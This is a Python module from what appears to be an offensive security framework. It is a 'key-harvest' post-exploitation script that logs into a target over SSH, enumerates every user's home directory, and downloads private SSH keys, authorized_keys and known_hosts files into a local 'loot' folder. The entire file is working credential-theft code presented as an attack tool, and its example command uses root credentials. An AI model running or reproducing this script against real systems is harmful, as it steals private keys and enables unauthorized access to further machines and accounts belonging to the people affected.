# scripts/ssh/post/key_harvest.py
import os
import paramiko
from scripts.base import BaseScript
from core.output import print_result, print_table, console
from core import session_db

class Script(BaseScript):
    name        = "key-harvest"
    protocol    = "ssh"
    category    = "post"
    description = "Recoge claves SSH privadas y authorized_keys de usuarios del sistema."

    EXAMPLES = [
        {"flag": "-u / -p", "desc": "Credenciales (idealmente root)",
         "good": "ssh --script=key-harvest -t 10.10.10.5 -u root -p Pass123!",
         "bad":  "ssh --script=key-harvest -t 10.10.10.5 -u lowpriv (sin root, solo su home)"},
    ]

    KEY_FILES = [
        "id_rsa", "id_ecdsa", "id_ed25519", "id_dsa",
        "id_rsa.pub", "id_ecdsa.pub", "id_ed25519.pub",
        "authorized_keys", "authorized_keys2", "known_hosts",
    ]

    def run(self, **kwargs):
        port    = int(kwargs.get("port") or 22)
        timeout = int(kwargs.get("timeout") or self.target.timeout or 5)
        out_dir = kwargs.get("out_dir") or os.path.join("loot", self.target.ip, "ssh_keys")
        ip      = self.target.ip

        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(ip, port=port, username=self.creds.user,
                           password=self.creds.password or "",
                           timeout=timeout, allow_agent=False, look_for_keys=False)
        except Exception as e:
            print_result("SSH", ip, "fail", f"no se pudo autenticar: {e}")
            return None

        sftp = client.open_sftp()
        _, stdout, _ = client.exec_command("getent passwd | cut -d: -f1,6")
        users_homes = {}
        for line in stdout.read().decode().splitlines():
            parts = line.split(":")
            if len(parts) == 2:
                users_homes[parts[0]] = parts[1]

        os.makedirs(out_dir, exist_ok=True)
        harvested = []

        for user, home in users_homes.items():
            for kf in self.KEY_FILES:
                remote_path = f"{home}/.ssh/{kf}"
                try:
                    with sftp.open(remote_path, "rb") as rf:
                        content = rf.read()
                    if not content:
                        continue
                    local_path = os.path.join(out_dir, f"{user}_{kf}")
                    with open(local_path, "wb") as lf:
                        lf.write(content)
                    is_private = not kf.endswith(".pub") and kf not in (
                        "authorized_keys", "authorized_keys2", "known_hosts"
                    )
                    print_result("SSH", ip, "pwned" if is_private else "info",
                                 f"{'CLAVE PRIVADA' if is_private else 'fichero'}: {user}:{remote_path}")
                    session_db.save_finding(ip, "SSH", "key_harvested",
                                            f"{user}:{remote_path}")
                    harvested.append((user, remote_path, local_path))
                except Exception:
                    pass

        sftp.close()
        client.close()

        if harvested:
            print_table(f"Claves SSH recolectadas — {ip}",
                        ["Usuario", "Ruta remota", "Ruta local"],
                        [(u, r, l) for u, r, l in harvested])
            print_result("SSH", ip, "pwned",
                         f"key-harvest: {len(harvested)} fichero(s)")
        else:
            print_result("SSH", ip, "info", "key-harvest: no se encontraron claves")

        return harvested
